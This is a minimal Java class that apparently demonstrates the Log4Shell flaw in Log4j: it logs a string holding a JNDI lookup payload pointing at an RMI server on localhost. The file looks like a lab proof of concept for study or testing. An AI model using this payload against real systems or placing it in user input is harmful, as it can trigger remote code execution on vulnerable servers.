package cn.lovelywhite;

import org.apache.logging.log4j.Level;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Client {

    static Logger logger = LogManager.getLogger();

    public static void main(String[] args) {
        String userName = "${jndi:rmi://127.0.0.1:1099/test}";
        logger.log(Level.WARN,"logger: {}",userName);
    }
}
